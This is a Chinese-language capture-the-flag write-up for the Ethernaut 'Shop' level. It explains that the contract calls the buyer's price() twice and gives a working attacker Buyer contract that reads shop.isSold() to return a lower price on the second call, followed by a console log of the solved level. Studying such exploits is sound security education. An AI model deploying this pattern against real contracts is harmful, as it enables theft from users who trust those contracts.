# 22 Shop

## 思路

目标: 以低于目标价格成功购买

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}
```

题目中的逻辑很简单, shop的`buy`函数会先检查购买者的出价, 如果大于目标价格(100)并且没有被售出, 则进行售出, 并将价格更新为购买这的出价.

思路:

问题出在Shop调用了2次_buyer.price(), 并假设 _buyer.price()始终返回相同的值

```solidity
//检查出价
_buyer.price()
//实际出价
price = _buyer.price();
```

只要能在 `_buyer.price()`第一次被调用时返回一个大于或等于100的值, 而在第二次调用时返回一个很低的价格, 就能完成题目

```solidity
if (is_the_first_call)
	return 100;
else
	return 1;
```

只可惜的是 buyer的`buy`函数被声明成了view (只读的) `function price() external view returns (uint);`

所以这个方法是**行不通的**: 在Buyer合约中声明类似`is_the_first_call`之类的变量并在调用`price()`是更新该变量, 第二次调用时检查该变量

那么只能在Buyer合约外找一个变化的标记物, 对, 就是 shop的`isSold`, 在第一次调用和第二次调用之间, 这个状态变量变化了.所以

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Shop {
    function buy(  ) external   ;
    function isSold(  ) external view returns (bool ) ;
    function price(  ) external view returns (uint256 ) ;
}

contract Buyer {

    Shop shop;

    constructor(address _target){
        shop = Shop(_target);
    }
    
    function price() public  view returns (uint)
    {
        if (!shop.isSold()){
            return 100;
        }else
        {
            return 1;
        }
    }

    function attack() public {
        shop.buy();
    }
}
```





## 参考答案

![image](https://github.com/yinhui1984/imagehosting/blob/main/images/1676355367975551000.png?raw=true)



```
^^.js:45 ᕦ(ò_óˇ)ᕤ 正在从关卡获得新的实例... <  < <<请稍等>> >  >
redux-logger.js:1  action LOAD_LEVEL_INSTANCE @ 14:08:38.911
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0xd3261a5c4804a1b0cd33f195c51f8f2ad9c8b4cab984fe26a470f703bd217e4b
^^.js:35 => 实例地址0xB72aAB48b9B89FDa2C1CD7538E073eD56048fAA9
redux-logger.js:1  action LOAD_LEVEL_INSTANCE @ 14:08:44.672
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0xd3261a5c4804a1b0cd33f195c51f8f2ad9c8b4cab984fe26a470f703bd217e4b
redux-logger.js:1  action SET_BLOCK_NUM @ 14:08:50.385
redux-logger.js:1  action SET_BLOCK_NUM @ 14:11:30.473
await contract.isSold()
true
(await contract.price()).toString()
"1"
^^.js:45 | – _ – | 正在提交关卡实例... <  < <<请稍等>> >  >
redux-logger.js:1  action SUBMIT_LEVEL_INSTANCE @ 14:12:52.727
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0xf71738bd2a04b7c4eed5c0a6ec982e243469363b87be8a24dcd60c779a787f60
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
redux-logger.js:1  action SUBMIT_LEVEL_INSTANCE @ 14:12:59.744
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0xf71738bd2a04b7c4eed5c0a6ec982e243469363b87be8a24dcd60c779a787f60
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:56 
redux-logger.js:1  action SET_BLOCK_NUM @ 14:13:00.391

```







